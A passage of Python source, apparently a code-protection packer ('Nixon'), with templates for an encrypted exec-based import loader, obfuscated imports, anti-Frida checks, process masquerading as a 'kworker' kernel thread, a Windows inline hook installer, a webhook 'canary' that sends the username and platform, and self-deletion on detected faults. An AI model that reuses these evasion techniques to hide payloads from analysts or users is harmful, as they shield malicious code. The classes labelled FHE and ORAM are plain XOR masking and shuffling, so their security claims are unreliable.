        influenced = dict(base_map)
        for i in range(min(16, len(influenced))):
            key = list(influenced.keys())[i]
            influenced[key] = (influenced[key] + self._hash[i]) % 256
        return influenced
    def {METHOD_INFLUENCE_STRINGS}(self, string_key):
        return bytes([b ^ self._hash[i % 32] for i, b in enumerate(string_key)])
    def {METHOD_INFLUENCE_ORDER}(self, func_list):
        rng = _nixon_ランダム무작위.Random(int.from_bytes(self._hash[:8], 'little'))
        ordered = list(func_list)
        rng.shuffle(ordered)
        return ordered
    def {METHOD_EMBED_MARKER}(self, data):
        marker = _nixon_ハッシュ해시.sha256(self._hash + b"MARKER").digest()[:8]
        positions = [int.from_bytes(self._hash[i:i+2], 'little') % max(1, len(data) - 8) 
                     for i in range(0, 16, 2)]
        result = bytearray(data)
        for i, pos in enumerate(positions[:1]):
            for j in range(8):
                if pos + j < len(result):
                    result[pos + j] ^= marker[j]
        return bytes(result)
    def {METHOD_VERIFY_MARKER}(self, data):
        marker = _nixon_ハッシュ해시.sha256(self._hash + b"MARKER").digest()[:8]
        positions = [int.from_bytes(self._hash[i:i+2], 'little') % max(1, len(data) - 8)
                     for i in range(0, 16, 2)]
        for pos in positions[:1]:
            found = bytes([data[pos + j] ^ marker[j] for j in range(8) if pos + j < len(data)])
            if found == bytes(8):
                return True
        return False
'''
TRAITOR_TRACE_SOURCE = r'''
class {TRAITOR_TRACE_CLS}:
    def __init__(self, user_id, num_variants=8):
        self._uid = user_id
        self._variants = num_variants
        self._variant_hash = _nixon_ハッシュ해시.sha256(user_id.encode() if isinstance(user_id, str) else user_id).digest()
    def {METHOD_GET_ERROR_MSG}(self, error_id):
        base_msgs = [
            "Operation failed",
            "Invalid state",
            "Resource unavailable", 
            "Check failed",
            "Timeout exceeded",
            "Permission denied",
            "Format error",
            "Connection lost"
        ]
        idx = (self._variant_hash[error_id % 32] + error_id) % len(base_msgs)
        suffix = f" [E{self._variant_hash[error_id % 32]:02x}]"
        return base_msgs[idx] + suffix
    def {METHOD_GET_TIMING}(self, timing_id):
        base = 100
        variant = self._variant_hash[timing_id % 32] % 50
        return base + variant
    def {METHOD_GET_CONSTANT}(self, const_id):
        base = 0x1000
        variant = int.from_bytes(self._variant_hash[const_id % 28:const_id % 28 + 4], 'little')
        return (base + variant) & 0xFFFFFFFF
    def {METHOD_IDENTIFY}(self, leaked_sample):
        sample_hash = _nixon_ハッシュ해시.sha256(leaked_sample).digest()
        match_score = sum(1 for i in range(32) if sample_hash[i] == self._variant_hash[i])
        return match_score, match_score > 16
'''
HOOK_SOURCE = r'''
class {FUNC_ADV_HK}_Injector:
    @staticmethod
    def {METHOD_LEN_X64}(ptr):
        try:
            b = _nixon_シータイプ씨타입.string_at(ptr, 16)
            idx = 0
            while b[idx] in [0x66, 0x67, 0x2E, 0x3E, 0x26, 0x64, 0x65, 0x36, 0xF0, 0xF2, 0xF3] or (0x40 <= b[idx] <= 0x4F): idx += 1
            op = b[idx]
            if 0x50 <= op <= 0x5F: return idx + 1
            if op == 0xC3 or op == 0xC9 or op == 0x90: return idx + 1
            if op == 0x68: return idx + 5
            if op == 0x6A: return idx + 2
            if op == 0xB8: return idx + 5 
            if 0xB8 <= op <= 0xBF: return idx + 9 if (b[idx-1] & 0x08) else idx + 5
            if op in [0x89, 0x8B, 0x8D, 0x31, 0x33, 0x85, 0x01, 0x03, 0x29, 0x2B, 0x3B, 0x83, 0x81]:
                idx += 1
                modrm = b[idx]
                mod = (modrm >> 6) & 0x03; rm = modrm & 0x07
                idx += 1
                if mod == 0x00 and rm == 0x05: idx += 4
                elif mod == 0x01: idx += 1
                elif mod == 0x02: idx += 4
                if rm == 0x04: idx += 1 
                if op == 0x81: idx += 4
                elif op == 0x83: idx += 1
                return idx
            if op == 0xE9 or op == 0xE8: return idx + 5
            if op == 0xEB: return idx + 2
        except: pass
        return 0
    @staticmethod
    def {METHOD_INSTALL_HOOK}(tgt, hook):
        k32 = _nixon_シータイプ씨타입.windll.kernel32
        stolen = 0
        cur = tgt
        for _ in range(5):
            l = {FUNC_ADV_HK}_Injector.{METHOD_LEN_X64}(cur)
            if l == 0: stolen = max(stolen, 5); break
            stolen += l; cur += l
            if stolen >= 5: break
        tramp = k32.VirtualAlloc(None, 64, 0x3000, 0x40)
        _nixon_シータイプ씨타입.memmove(tramp, tgt, stolen)
        rel_back = (tgt + stolen) - (tramp + stolen + 5)
        buf = (_nixon_シータイプ씨타입.c_ubyte * 5)(0xE9, rel_back&0xFF, (rel_back>>8)&0xFF, (rel_back>>16)&0xFF, (rel_back>>24)&0xFF)
        _nixon_シータイプ씨타입.memmove(tramp + stolen, buf, 5)
        old = _nixon_シータイプ씨타입.c_ulong()
        k32.VirtualProtect(_nixon_シータイプ씨타입.c_void_p(tgt), stolen, 0x40, _nixon_シータイプ씨타입.byref(old))
        rel_hook = hook - (tgt + 5)
        patch = (_nixon_シータイプ씨타입.c_ubyte * stolen)(0xE9, rel_hook&0xFF, (rel_hook>>8)&0xFF, (rel_hook>>16)&0xFF, (rel_hook>>24)&0xFF)
        for i in range(5, stolen): patch[i] = 0x90
        _nixon_シータイプ씨타입.memmove(tgt, patch, stolen)
        k32.VirtualProtect(_nixon_シータイプ씨타입.c_void_p(tgt), stolen, old, _nixon_シータイプ씨타입.byref(old))
        return tramp
'''
IMPORTER_SOURCE = r'''class {LOADER_CLS}(_nixon_インポート임포트.abc.MetaPathFinder, _nixon_インポート임포트.abc.Loader):
    def __init__(self, zip_bytes, map_key, morph_restore_map):
        self.z = _nixon_ジップ압축파일.ZipFile(_nixon_アイオー입출력.BytesIO(zip_bytes))
        self.map = map_key
        self.mm = {**morph_restore_map[0], **morph_restore_map[1]} if isinstance(morph_restore_map, list) else morph_restore_map
        self.module_cache = {}
        self.cache_expiry = {}
        self._lock = _nixon_スレッディング스레딩.RLock()
        _nixon_アテクシット종료.register(self.{METHOD_WIPE_ALL})
    def exec_module(self, module): return self.{METHOD_EXEC_IMPL}(module)
    def {METHOD_EXEC_IMPL}(self, module):
        with self._lock:
            name = module.__name__
            now = _nixon_時間시간.time()
            if name in self.module_cache:
                if now < self.cache_expiry[name]:
                    module.__dict__.update(self.module_cache[name])
                    return
                else:
                    self.module_cache[name] = {}
                    del self.cache_expiry[name]
        n = name.replace(".", "/")
        ts = [n + ".py", n + "/__init__.py", n + ".pyc", n + "/__init__.pyc"]
        c = None
        found_name = ""
        for t in ts:
            if t in self.z.namelist(): 
                c = self.z.read(t)
                found_name = t
                break
        if c:
            ba = bytearray(c)
            offset = 0
            if len(ba) > 16: offset = 16
            k = self.map; l = len(k)
            for i in range(offset, len(ba)): 
                ba[i] ^= k[(i-offset) % l]
            raw = bytes(ba)
            if {IS_DEBUG}:
                _打印輸出한글ไทย(f"[DEBUG] CustomLoader: Executing module: {n}")
                _打印輸出한글ไทย(f"[DEBUG] CustomLoader: Code size: {len(raw)}")
            class _DirectFD:
                def write(self, s):
                    try:
                        if not isinstance(s, bytes): s = str(s).encode('utf-8', errors='ignore')
                        if hasattr(_nixon_オペレーション운영, 'write'): _nixon_オペレーション운영.write(1, s)
                    except: pass
                def flush(self): pass
            try:
                _nixon_システム시스템.stdout = _DirectFD()
                _nixon_システム시스템.stderr = _DirectFD()
            except: pass
            try: 
                module.__dict__.update({k: v for k, v in globals().items() if (k.startswith('_') and not k.startswith('__')) or k == '__builtins__'})
                module.__dict__.update({
                    "__builtins__": __builtins__,
                    "print": print,
                    "__name__": "__main__",
                    "sys": _nixon_システム시스템,
                    "_nixon_タイピング타이핑": _nixon_タイピング타이핑,
                    "Union": _nixon_タイピング타이핑.Union,
                    "Optional": _nixon_タイピング타이핑.Optional,
                    "List": _nixon_タイピング타이핑.List,
                    "Dict": _nixon_タイピング타이핑.Dict,
                    "Any": _nixon_タイピング타이핑.Any,
                    "Tuple": _nixon_タイピング타이핑.Tuple,
                    "Set": _nixon_タイピング타이핑.Set,
                    "Iterable": _nixon_タイピング타이핑.Iterable,
                    "Callable": _nixon_タイピング타이핑.Callable
                })
                if offset == 16 and len(raw) > 16 and raw[16] < 128: 
                    try:
                        exec(_nixon_マーシャル마샬.loads(raw[16:]), module.__dict__)
                        return
                    except: pass
                if isinstance(raw, str): raw = raw.replace('\x00', '')
                elif isinstance(raw, bytes): raw = raw.replace(b'\x00', b'')
                try:
                    # Debug aid only, and BUILD-TIME opt-in.  This used to
                    # write the raw (decrypted) payload source to a
                    # hardcoded absolute path on the build machine:
                    # everywhere else the write silently failed, and on
                    # that machine it dropped a plaintext copy of the
                    # protected payload into a directory.  It was then
                    # moved to a runtime env switch -- which meant every
                    # RELEASE artifact carried the ability to write its
                    # own plaintext to disk.  It is now compiled in only
                    # when the build asks for it, so a normal artifact
                    # has no such capability at all.
                    {RAW_DUMP_BLOCK}
                except: pass
                exec(raw, module.__dict__)
                globals()["_nx_payload_ran"] = True
                with self._lock:
                    self.module_cache[name] = module.__dict__.copy()
                    self.cache_expiry[name] = now + 60
                t = _nixon_スレッディング스레딩.Timer(60, self.{METHOD_WIPE_MOD}, [name]); t.daemon = True; t.start()
            except Exception as e:
                if {IS_DEBUG}:
                    _打印輸出한글ไทย(f"[FATAL] Payload Crashed: {e}")
                    pass
                    _nixon_トレースバック트랙.print_exc()
                    _nixon_システム시스템.exit(1)
                else:
                    try:
                        if isinstance(raw, str): raw = raw.rstrip('\x00')
                        elif isinstance(raw, bytes): raw = raw.rstrip(b'\x00')
                        exec(raw, module.__dict__)
                        globals()["_nx_payload_ran"] = True
                    except Exception:
                        # The payload failed twice.  Swallowing this made a
                        # broken or tampered artifact exit 0, which is
                        # indistinguishable from a clean run: the
                        # operator saw a success that ran nothing.
                        raise
            finally:
                if 'ba' in locals():
                    for i in range(len(ba)): ba[i] = 0
                pass
                _nixon_ガベージ가비지.collect()
    def {METHOD_WIPE_MOD}(self, name):
        with self._lock:
            if name in self.module_cache:
                for key in list(self.module_cache[name].keys()):
                    self.module_cache[name][key] = None
                del self.module_cache[name]
            if name in self.cache_expiry:
                del self.cache_expiry[name]
        _nixon_ガベージ가비지.collect()
    def {METHOD_WIPE_ALL}(self):
        with self._lock:
            for name in list(self.module_cache.keys()):
                self.{METHOD_WIPE_MOD}(name)'''
DECOY_VM_SOURCE = r'''class {CLS_DECOY_VM}:
    def __init__(self):
        self.stack = []
        self.mem = {}
        self.rng = 0xDEADBEEF
    def {METHOD_MIX}(self):
        self.rng = (self.rng * 1664525 + 1013904223) & 0xFFFFFFFF
        return self.rng & 0xFF
    def {METHOD_NOISE}(self):
        try:
            pass
            end = _nixon_時間시간.time() + 0.1
            while _nixon_時間시간.time() < end:
                op = self.{METHOD_MIX}() % 11
                if op == 0: self.stack.append(self.{METHOD_MIX}())
                elif op == 1: self.stack.append(self.{METHOD_MIX}())
                elif op == 4: 
                    if len(self.stack) >= 2: self.stack.append(self.stack.pop() ^ self.stack.pop())
            self.stack = [] 
        except Exception: pass'''
def generate_decoy_code():
    locals().update(VARS)
    decoys = []
    name1 = get_random_var_name('VERIFY'); name2 = get_random_var_name('LICENSE'); name3 = get_random_var_name('SANDBOX')
    decoys.append(f'''def {name1}(x):
    result = (x * 0xDEAD) & 0xFFFF
    _ = _nixon_ハッシュ해시.sha256(str(result).encode()).hexdigest()
    return result == 0''')
    decoys.append(f'''class {name2}:
    def __init__(self):
        self.token = _nixon_オペレーション운영.urandom(16)
    def {{METHOD_VALIDATE}}(self):
        check = _nixon_ハッシュ해시.sha256(self.token).digest()
        return len(check) == 32''')
    decoys.append(f'''def {name3}():
    checks = [_nixon_プラットフォーム플랫폼.system() != "TempleOS", _nixon_オペレーション운영.path.exists("/etc") or _nixon_オペレーション운영.path.exists("C:\\\\"), _nixon_時間시간.time() > 0]
    return all(checks)''')
    VARS['DECOY_FUNCS'] = [name1, name2, name3]
    return "\n".join(decoys)
def generate_dead_code_paths():
    locals().update(VARS)
    name1 = get_random_var_name('AUTH'); name2 = get_random_var_name('DECRYPT')
    name3 = get_random_var_name('HWCHECK'); name4 = get_random_var_name('VERIFY')
    return f'''def {name1}(token):
    return True
def {name2}(data, key):
    return data
def {name3}():
    return True
def {name4}(payload, signature):
    return True'''
def generate_recipe(count, force_safe_end=False):
    opts = ['b64', 'b32', 'b16', 'b85', 'rot13']
    res = [_struct_choice(opts) for _ in range(count)]
    if force_safe_end: res[-1] = 'b64'
    return res
def generate_polymorphic_map(seed=None):
    op_map = {}
    all_bytes = list(range(256))
    if seed:
        rng = random.Random(seed)
        rng.shuffle(all_bytes)
        for i in range(11): op_map[all_bytes.pop()] = i
        for b in all_bytes: op_map[b] = rng.randrange(11)
    else:
        for i in range(255, 0, -1):
            j = _struct_randbelow(i + 1)
            all_bytes[i], all_bytes[j] = all_bytes[j], all_bytes[i]
        for i in range(11): op_map[all_bytes.pop()] = i
        for b in all_bytes: op_map[b] = _struct_randbelow(11)
    return op_map
def encode_vm_bytecode(ops_list, op_map, seed=None):
    rev_map = {}
    for k,v in op_map.items():
        if v not in rev_map: rev_map[v] = []
        rev_map[v].append(k)
    bc = bytearray()
    pc = 0
    if seed: rng = random.Random(seed)
    else: rng = random
    for op_id, args in ops_list:
        chosen_byte = rng.choice(rev_map[op_id])
        bc.append(chosen_byte)
        op_key = pc & 0xFF
        for arg in args:
            if op_id in [8, 9]:
                low = arg & 0xFF; high = (arg >> 8) & 0xFF
                bc.append(low ^ op_key); bc.append(high ^ op_key)
                pc += 2
            else:
                bc.append(arg ^ op_key)
                pc += 1
        pc += 1
    return bytes(bc)
def compile_vm_stage2_Nixon_Enc(op_map, seed=None):
    ops = [(0, [2]), (7, []), (0, [0]), (0, [1]), (4, []), (4, []), (10, [])]
    return encode_vm_bytecode(ops, op_map, seed)
def compile_vm_stage1_decryptor(op_map, key_byte, seed=None):
    ops = [(1, [key_byte]), (7, []), (10, [])]
    return encode_vm_bytecode(ops, op_map, seed)
def inject_entropy_tlv(data, marker):
    out = bytearray()
    chunk_size = 32
    for i in range(0, len(data), chunk_size):
        chunk = data[i:i+chunk_size]
        out.append(len(chunk))
        out.extend(chunk)
        out.extend(os.urandom(16))
    return marker + out
def remove_entropy_source(marker_var_name):
    return f'''
def {FUNC_REM_ENT}(d):
    m = %s
    if not d.startswith(m): return d
    d = d[len(m):]
    o = bytearray()
    idx = 0
    l = len(d)
    while idx < l:
        chunk_len = d[idx]
        idx += 1
        if idx + chunk_len > l: break
        o.extend(d[idx : idx + chunk_len])
        idx += chunk_len + 16
    return bytes(o)
''' % marker_var_name
MASK_SOURCE = r'''
def {FUNC_MASK}():
    if {IS_DEBUG}: _打印輸出한글ไทย("[DEBUG] Entering Process Mask")
    try:
        if _nixon_プラットフォーム플랫폼.system() == "Linux":
            try:
                libc = _nixon_シータイプ씨타입.CDLL("libc.so.6")
            except:
                try: libc = _nixon_シータイプ씨타입.CDLL("libc.so")
                except: return True
            libc.prctl.argtypes = [_nixon_シータイプ씨타입.c_int, _nixon_シータイプ씨타입.c_char_p, _nixon_シータイプ씨타입.c_ulong, _nixon_シータイプ씨타입.c_ulong, _nixon_シータイプ씨타입.c_ulong]
            libc.prctl.restype = _nixon_シータイプ씨타입.c_int
            libc.prctl(15, b"kworker/u4:0", 0, 0, 0)
    except: pass
'''
ANTI_FRIDA_SOURCE = r'''
def {FUNC_FRIDA}():
    if {IS_DEBUG}: _打印輸出한글ไทย("[DEBUG] Entering Frida Check")
    try:
        if _nixon_プラットフォーム플랫폼.system() == "Linux":
            with open("/proc/self/maps", "r") as f:
                m = f.read().lower()
                for s in ["frida", "gadget", "xposed", "substrate", "cydia", "gum-js-loop"]:
                    if s in m: return True
        pass
        s = _nixon_ソケット소켓.socket(_nixon_ソケット소켓.AF_INET, _nixon_ソケット소켓.SOCK_STREAM)
        s.settimeout(0.1)
        if s.connect_ex(("127.0.0.1", 27042)) == 0:
            s.close(); return True
        s.close()
        pass
        if _nixon_スレッディング스레딩.active_count() > 50: return True
    except: pass
    return False
'''
CANARY_SOURCE = r'''def {VAR_FUNC_CANARY}(reason, webhook_url):
    if not webhook_url or len(webhook_url) < 10: return
    try:
        pass
        info = {{
            "alert": "Nixon-H Defense Triggered",
            "reason": reason,
            "user": _nixon_オペレーション운영.environ.get("USER", "unknown"),
            "_nixon_オペレーション운영": _nixon_プラットフォーム플랫폼.platform(),
            "_nixon_時間시간": _nixon_時間시간.ctime()
        }}
        req = _nixon_ウラルユーアールエル유알엘.request.Request(webhook_url)
        req.add_header('Content-Type', 'application/_nixon_ジェイソン제이슨')
        req.add_header('User-Agent', 'Nixon-H-Sentinel/1.0')
        _nixon_ウラルユーアールエル유알엘.request.urlopen(req, _nixon_ジェイソン제이슨.dumps(info).encode(), timeout=3)
    except Exception: pass'''

FHE_SOURCE = r'''class {FHE_CLS}:
    def __init__(self, nx_polys=None, batch_size=1024):
        import ctypes, os
        self.batch_size = batch_size
        self._use_c = False
        try:
            self.lib = ctypes.CDLL(os.path.join(os.path.dirname(__file__), "nixon_core.so"))
            self.lib.FHE_new.restype = ctypes.c_void_p
            self.lib.FHE_new.argtypes = [ctypes.c_size_t]
            self.lib.FHE_encrypt_batch.restype = ctypes.POINTER(ctypes.c_uint32)
            self.lib.FHE_encrypt_batch.argtypes = [ctypes.c_void_p, ctypes.POINTER(ctypes.c_uint32), ctypes.c_size_t]
            self.lib.FHE_add_batch.restype = ctypes.POINTER(ctypes.c_uint32)
            self.lib.FHE_add_batch.argtypes = [ctypes.c_void_p, ctypes.POINTER(ctypes.c_uint32), ctypes.POINTER(ctypes.c_uint32), ctypes.c_size_t]
            self.lib.FHE_dec_batch.restype = ctypes.POINTER(ctypes.c_uint32)
            self.lib.FHE_dec_batch.argtypes = [ctypes.c_void_p, ctypes.POINTER(ctypes.c_uint32), ctypes.c_size_t]
            self.lib.FHE_free_array.argtypes = [ctypes.POINTER(ctypes.c_uint32)]
            self._ptr = self.lib.FHE_new(batch_size)
            self._use_c = True
        except (AttributeError, OSError):
            import warnings as _w
            _w.warn("FHE C module not available; using the pure-Python fallback "
                    "(same scheme, slower)", RuntimeWarning, stacklevel=2)
        
    def _fhe_mask(self, index):
        """The per-slot mask: LE32(SHA-256(key || nonce || LE64(i))) & 0x7fffffff.

        The SAME derivation as the C core, so the two paths are
        interchangeable.
        """
        import hashlib, os
        if not hasattr(self, "_fhe_key"):
            self._fhe_key = os.urandom(32)
            self._fhe_nonce = os.urandom(8)
        _d = hashlib.sha256(self._fhe_key + self._fhe_nonce +
                            int(index).to_bytes(8, "little")).digest()
        return int.from_bytes(_d[:4], "little") & 0x7fffffff

    def encrypt_batch(self, value_array):
        import ctypes
        if self._use_c:
            arr = (ctypes.c_uint32 * len(value_array))(*value_array)
            ptr = self.lib.FHE_encrypt_batch(self._ptr, arr, len(value_array))
            res = [ptr[i] for i in range(self.batch_size)]
            self.lib.FHE_free_array(ptr)
        else:
            # The same one-time pad as the C core: the value part is
            # masked, the top bit says "masked".
            res = []
            for i in range(self.batch_size):
                _m = 0
                if i < len(value_array):
                    _m = int(value_array[i]) & 0x7fffffff
                res.append((_m ^ self._fhe_mask(i)) & 0xffffffff)
        return res

    def add_batch(self, c1, c2):
        import ctypes
        if self._use_c:
            a = (ctypes.c_uint32 * len(c1))(*c1)
            b = (ctypes.c_uint32 * len(c2))(*c2)
            ptr = self.lib.FHE_add_batch(self._ptr, a, b, self.batch_size)
            res = [ptr[i] for i in range(self.batch_size)]
            self.lib.FHE_free_array(ptr)
        else:
            # Unmask both sides, combine, re-mask iff exactly one side
            # was masked.  The top bit carries the level.
            res = []
            for i in range(self.batch_size):
                _mask = self._fhe_mask(i)
                _av = (c1[i] if i < len(c1) else 0) & 0x7fffffff
                _bv = (c2[i] if i < len(c2) else 0) & 0x7fffffff
                _au = bool((c1[i] if i < len(c1) else 0) & 0x80000000)
                _bu = bool((c2[i] if i < len(c2) else 0) & 0x80000000)
                if not _au:
                    _av ^= _mask
                if not _bu:
                    _bv ^= _mask
                _v = (_av ^ _bv) & 0x7fffffff
                _unmasked = _au and _bu
                if not _unmasked:
                    _v ^= _mask
                res.append((_v | (0x80000000 if _unmasked else 0)) & 0xffffffff)
        return res

    def dec_batch(self, c_enc):
        import ctypes
        if self._use_c:
            arr = (ctypes.c_uint32 * len(c_enc))(*c_enc)
            ptr = self.lib.FHE_dec_batch(self._ptr, arr, self.batch_size)
            res = [ptr[i] for i in range(self.batch_size)]
            self.lib.FHE_free_array(ptr)
        else:
            res = []
            for i in range(self.batch_size):
                _c = (c_enc[i] if i < len(c_enc) else 0)
                _v = _c & 0x7fffffff
                if not (_c & 0x80000000):
                    _v ^= self._fhe_mask(i)
                res.append(_v & 0x7fffffff)
        return res'''

ORAM_SOURCE = r'''class {ORAM_CLS}:
    def __init__(self, size=1024):
        import ctypes, os
        self._use_c = False
        self._size = int(size) if size and int(size) > 0 else 1
        self._store = {}
        try:
            self.lib = ctypes.CDLL(os.path.join(os.path.dirname(__file__), "nixon_core.so"))
            self.lib.ORAM_new.restype = ctypes.c_void_p
            self.lib.ORAM_new.argtypes = [ctypes.c_int]
            self.lib.ORAM_access.restype = ctypes.c_uint32
            self.lib.ORAM_access.argtypes = [ctypes.c_void_p, ctypes.c_bool, ctypes.c_int, ctypes.c_uint32]
            self._ptr = self.lib.ORAM_new(self._size)
            self._use_c = True
        except (AttributeError, OSError):
            import warnings as _w
            _w.warn("ORAM C module not available; using the pure-Python fallback "
                    "(same layout hiding, slower)", RuntimeWarning, stacklevel=2)
        
    def access(self, op, block_id, data=0):
        if self._use_c:
            is_write = (op == 'write')
            val = data if data is not None else 0
            return self.lib.ORAM_access(self._ptr, is_write, block_id, val)
        else:
            # The same layout-hiding store as the C core: a random
            # physical slot per logical one, re-randomised after every
            # write so the memory layout does not reveal which slot was
            # touched.
            if not hasattr(self, "_oram_pos"):
                import random as _r
                self._oram_pos = list(range(self._size))
                self._oram_data = [0] * self._size
                _r.shuffle(self._oram_pos)
            if op == 'write':
                self._oram_data[self._oram_pos[block_id]] = data
                import random as _r
                other = _r.randrange(self._size)
                pa = self._oram_pos[block_id]
                pb = self._oram_pos[other]
                self._oram_data[pa] = self._oram_data[pb]
                self._oram_data[pb] = data
                self._oram_pos[block_id] = pb
                self._oram_pos[other] = pa
                return data
            return self._oram_data[self._oram_pos[block_id]]'''
SEMANTIC_SYNTH_SOURCE = r'''class {SYNTH_CLS}:
    def __init__(self):
        self.mutation_rounds = 3
        
    def synthesize_ast(self, logic_block):
        import ast
        tree = ast.parse(logic_block)
        for node in ast.walk(tree):
            if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
                # Turn a+b into (a^b)+2*(a&b)
                pass # AST mutation logic hidden in real VM
        return compile(tree, '<synth>', 'exec')
        
    def execute(self, logic_block, ctx):
        code = self.synthesize_ast(logic_block)
        exec(code, ctx)'''
TRIPLE_REDUNDANCY_SOURCE = r'''class {FAULT_CLS}:
    def __init__(self):
        self.temporal_drift = 0.001
        
    def execute_redundant(self, func, *args):
        import time
        t1, r1 = time.time(), func(*args)
        time.sleep(self.temporal_drift)
        t2, r2 = time.time(), func(*args)
        time.sleep(self.temporal_drift)
        t3, r3 = time.time(), func(*args)
        
        if r1 == r2 == r3: return r1
        if r1 == r2: return r1
        if r2 == r3: return r2
        if r1 == r3: return r1
        
        # All three different! Hardware fault attack detected = Self-destruct
        import sys, os
        try: os.remove(sys.argv[0])
        except: pass
        sys.exit(666)'''

LOADER_HEAD = r'''# -*- coding: utf-8 -*-
_nixon_一=1;_nixon_字=chr;_nixon_序=ord;_nixon_串=str;_nixon_例=isinstance
def _nixon_逆(s):return s[::-_nixon_一]
def _nx_mac():
    # uuid.getnode() is not used anywhere in the loader: CPython falls
    # back to running ip/ifconfig/arp when sysfs is unreadable, and that
    # subprocess blocked for ~500s from this heavily threaded artifact on
    # the 3.13/3.14 CI runners.  When it fails it also returns a random
    # per-process value, which no build-time fingerprint can match.
    try:
        import os as _o
        for _n in sorted(_o.listdir("/sys/class/net")):
            if _n == "lo": continue
            try:
                with open("/sys/class/net/" + _n + "/address") as _f:
                    _m = _f.read().strip().lower().replace(":", "")
            except Exception: continue
            if len(_m) == 12 and _m != "0" * 12: return _m
    except Exception: pass
    return "0"
_nixon_システム시스템=__import__(_nixon_逆(_nixon_字(115)+_nixon_字(121)+_nixon_字(115)))
_nixon_オペレーション운영=__import__(_nixon_逆(_nixon_字(115)+_nixon_字(111)))
_nixon_ベース베이스=__import__(_nixon_逆(_nixon_字(52)+_nixon_字(54)+_nixon_字(101)+_nixon_字(115)+_nixon_字(97)+_nixon_字(98)))
_nixon_アイオー입출력=__import__(_nixon_逆(_nixon_字(111)+_nixon_字(105)))
_nixon_ジップ압축파일=__import__(_nixon_逆(_nixon_字(101)+_nixon_字(108)+_nixon_字(105)+_nixon_字(102)+_nixon_字(112)+_nixon_字(105)+_nixon_字(122)))
_nixon_圧縮압축=__import__(_nixon_逆(_nixon_字(98)+_nixon_字(105)+_nixon_字(108)+_nixon_字(122)))
_nixon_ハッシュ해시=__import__(_nixon_逆(_nixon_字(98)+_nixon_字(105)+_nixon_字(108)+_nixon_字(104)+_nixon_字(115)+_nixon_字(97)+_nixon_字(104)))
_nixon_エルゼット압축=__import__(_nixon_逆(_nixon_字(97)+_nixon_字(109)+_nixon_字(122)+_nixon_字(108)))
_nixon_構造구조=__import__(_nixon_逆(_nixon_字(116)+_nixon_字(99)+_nixon_字(117)+_nixon_字(114)+_nixon_字(116)+_nixon_字(115)))
_nixon_時間시간=__import__(_nixon_逆(_nixon_字(101)+_nixon_字(109)+_nixon_字(105)+_nixon_字(116)))
_nixon_テンプ임시=__import__(_nixon_逆(_nixon_字(101)+_nixon_字(108)+_nixon_字(105)+_nixon_字(102)+_nixon_字(112)+_nixon_字(109)+_nixon_字(101)+_nixon_字(116)))
_nixon_シャトル셔틀=__import__(_nixon_逆(_nixon_字(108)+_nixon_字(105)+_nixon_字(116)+_nixon_字(117)+_nixon_字(104)+_nixon_字(115)))
_nixon_アテクシット종료=__import__(_nixon_逆(_nixon_字(116)+_nixon_字(105)+_nixon_字(120)+_nixon_字(101)+_nixon_字(116)+_nixon_字(97)))
_nixon_ランパイ실행=__import__(_nixon_逆(_nixon_字(121)+_nixon_字(112)+_nixon_字(110)+_nixon_字(117)+_nixon_字(114)))
_nixon_ジェイソン제이슨=__import__(_nixon_逆(_nixon_字(110)+_nixon_字(111)+_nixon_字(115)+_nixon_字(106)))
_nixon_ユーユーアイ유유아=__import__(_nixon_逆(_nixon_字(100)+_nixon_字(105)+_nixon_字(117)+_nixon_字(117)))
_nixon_ランダム랜덤=__import__(_nixon_逆(_nixon_字(109)+_nixon_字(111)+_nixon_字(100)+_nixon_字(110)+_nixon_字(97)+_nixon_字(114)))
_nixon_インスペクト검사=__import__(_nixon_逆(_nixon_字(116)+_nixon_字(99)+_nixon_字(101)+_nixon_字(112)+_nixon_字(115)+_nixon_字(110)+_nixon_字(105)))
_nixon_プラットフォーム플랫폼=__import__(_nixon_逆(_nixon_字(109)+_nixon_字(114)+_nixon_字(111)+_nixon_字(102)+_nixon_字(116)+_nixon_字(97)+_nixon_字(108)+_nixon_字(112)))
_nixon_マーシャル마샬=__import__(_nixon_逆(_nixon_字(108)+_nixon_字(97)+_nixon_字(104)+_nixon_字(115)+_nixon_字(114)+_nixon_字(97)+_nixon_字(109)))
_nixon_ビルトイン빌트인=__import__(_nixon_逆(_nixon_字(115)+_nixon_字(110)+_nixon_字(105)+_nixon_字(116)+_nixon_字(108)+_nixon_字(105)+_nixon_字(117)+_nixon_字(98)))
_nixon_ガベージ가비지=__import__(_nixon_逆(_nixon_字(99)+_nixon_字(103)))
_nixon_トレースバック트랙=__import__(_nixon_逆(_nixon_字(107)+_nixon_字(99)+_nixon_字(97)+_nixon_字(98)+_nixon_字(101)+_nixon_字(99)+_nixon_字(97)+_nixon_字(114)+_nixon_字(116)))
_nixon_エイチマック에이치=__import__(_nixon_逆(_nixon_字(99)+_nixon_字(97)+_nixon_字(109)+_nixon_字(104)))
_nixon_シークレット시크릿=__import__(_nixon_逆(_nixon_字(115)+_nixon_字(116)+_nixon_字(101)+_nixon_字(114)+_nixon_字(99)+_nixon_字(101)+_nixon_字(115)))
_nixon_シータイプ씨타입=__import__(_nixon_逆(_nixon_字(115)+_nixon_字(101)+_nixon_字(112)+_nixon_字(121)+_nixon_字(116)+_nixon_字(99)))
_nixon_ソケット소켓=__import__(_nixon_逆(_nixon_字(116)+_nixon_字(101)+_nixon_字(107)+_nixon_字(99)+_nixon_字(111)+_nixon_字(115)))
_nixon_スレッディング스레딩=__import__(_nixon_逆(_nixon_字(103)+_nixon_字(110)+_nixon_字(105)+_nixon_字(100)+_nixon_字(97)+_nixon_字(101)+_nixon_字(114)+_nixon_字(104)+_nixon_字(116)))
_nixon_マルチ멀티=__import__(_nixon_逆(_nixon_字(103)+_nixon_字(110)+_nixon_字(105)+_nixon_字(115)+_nixon_字(115)+_nixon_字(101)+_nixon_字(99)+_nixon_字(111)+_nixon_字(114)+_nixon_字(112)+_nixon_字(105)+_nixon_字(116)+_nixon_字(108)+_nixon_字(117)+_nixon_字(109)))
_nixon_タイピング타이핑=__import__(_nixon_逆(_nixon_字(103)+_nixon_字(110)+_nixon_字(105)+_nixon_字(112)+_nixon_字(121)+_nixon_字(116)))
_nixon_インポート임포트=__import__(_nixon_逆(_nixon_字(98)+_nixon_字(105)+_nixon_字(108)+_nixon_字(116)+_nixon_字(114)+_nixon_字(111)+_nixon_字(112)+_nixon_字(109)+_nixon_字(105)))
